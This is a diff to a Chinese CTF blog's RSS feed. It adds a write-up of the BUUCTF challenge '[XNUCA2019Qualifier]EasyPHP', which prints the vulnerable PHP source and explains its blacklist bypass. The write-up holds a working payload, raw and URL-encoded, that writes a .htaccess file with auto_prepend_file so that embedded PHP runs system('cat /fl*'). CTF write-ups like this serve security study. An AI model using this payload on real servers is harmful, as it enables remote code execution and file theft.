@@ -118,6 +118,7 @@
         <category>shell反弹</category>
         <category>phpexit绕过</category>
         <category>require_once函数</category>
+        <category>xss</category>
         <item>
             <guid isPermalink="true">http://odiws.github.io/2024/12/01/NewStarCT-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-Upload-again/</guid>
             <title>[NewStarCT_2023_公开赛道]Upload_again!</title>
@@ -445,6 +446,72 @@ print(flag+&#39;&amp;#125;&#39;)
 &lt;p&gt;&lt;img data-src=&#34;https://mmbiz.qpic.cn/mmbiz_png/crOK73kjDuiaCYofiaN8P1yvfgjTKEPdNbUUmZdib44GLJRFQC74xxXcC4vgnsMWwpEibich74wfnVr2uwGaXrTqRibQ/640?wx_fmt=png&amp;amp;from=appmsg&amp;amp;tp=webp&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
 &lt;p&gt;内存马看了一下，出了最后两句，其他的还是很好理解的，就是新增了一个&lt;/p&gt;
 &lt;p&gt;路由，进行了命令执行，很神奇&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/09/23/XNUCA2019Qualifier-EasyPHP/</guid>
+            <title>[XNUCA2019Qualifier]EasyPHP</title>
+            <link>http://odiws.github.io/2024/09/23/XNUCA2019Qualifier-EasyPHP/</link>
+            <category>buuctf</category>
+            <category>文件上传</category>
+            <pubDate>Mon, 23 Sep 2024 13:38:58 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;xnuca2019qualifiereasyphp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xnuca2019qualifiereasyphp&#34;&gt;#&lt;/a&gt; [XNUCA2019Qualifier]EasyPHP&lt;/h2&gt;
+&lt;p&gt;源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    $files = scandir(&#39;./&#39;); 
+    foreach($files as $file) &amp;#123;
+        if(is_file($file))&amp;#123;
+            if ($file !== &amp;quot;index.php&amp;quot;) &amp;#123;
+                unlink($file);
+            &amp;#125;
+        &amp;#125;
+    &amp;#125;
+    include_once(&amp;quot;fl3g.php&amp;quot;);
+    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) &amp;#123;
+        highlight_file(__FILE__);
+        die();
+    &amp;#125;
+    $content = $_GET[&#39;content&#39;];
+    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) &amp;#123;
+        echo &amp;quot;Hacker&amp;quot;;
+        die();
+    &amp;#125;
+    $filename = $_GET[&#39;filename&#39;];
+    if(preg_match(&amp;quot;/[^a-z\.]/&amp;quot;, $filename) == 1) &amp;#123;
+        echo &amp;quot;Hacker&amp;quot;;
+        die();
+    &amp;#125;
+    $files = scandir(&#39;./&#39;); 
+    foreach($files as $file) &amp;#123;
+        if(is_file($file))&amp;#123;
+            if ($file !== &amp;quot;index.php&amp;quot;) &amp;#123;
+                unlink($file);
+            &amp;#125;
+        &amp;#125;
+    &amp;#125;
+    file_put_contents($filename, $content . &amp;quot;\nJust one chance&amp;quot;);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;分析：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;文件清理：代码首先扫描当前目录中的文件，然后尝试删除除index.php之外的所有文件。
+包含外部文件：它包含一个名为的文件fl3g.php。
+输入验证：检查URL 中的参数content（黑名单：on，html,type,flag,upload,file）。filename(匹配任何不是小写字母（a-z）和点（.）的字符)
+安全检查：它进行检查以防止某些模式content并验证filename。
+最终文件写入：如果所有检查都通过，它会将其写入content指定内容filename并附加“仅一次机会”。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;文件名有。和字母的就可以想到配置文件，并且写的东西 content 还没有过滤&lt;/p&gt;
+&lt;p&gt;首选.htaccess 文件（方法很多：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvODI2Nz90aW1lX18xMzExPW40JTJCeG5EMERjN2V4eURqeFlxR05XUHRzQVlZNUdPNHJsV1JlRCN0b2MtNiVFRiVCQyU4OSVFRiVCQyU5QQ==&#34;&gt;https://xz.aliyun.com/t/8267?time__1311=n4%2BxnD0Dc7exyDjxYqGNWPtsAYY5GO4rlWReD#toc-6）：&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;最简单的就是 php_value 方法：（file 被禁了可以用 \ 绕过）&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-.htaccess&#34;&gt;?content=php_value auto_prepend_fi\
+le .htaccess
+#&amp;lt;?php system(&#39;cat /fl*&#39;);?&amp;gt;\&amp;amp;filename=.htaccess
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;url 编码一下：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-.htaccess&#34;&gt;?content=php_value%20auto_prepend_fi%5C%0Ale%20.htaccess%0A%23%3C%3Fphp%20system(&#39;cat%20%2Ffl*&#39;)%3B%3F%3E%5C&amp;amp;filename=.htaccess
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;直接回 index.php 看 flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/NPUCTF2020-ezlogin/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoaW55Z29kL2FydGljbGUvZGV0YWlscy8xMjkzMzg4MzY=&#34;&gt;https://blog.csdn.net/shinygod/article/details/129338836&lt;/span&gt;&lt;/p&gt;
  ]]></description>
         </item>
         <item>
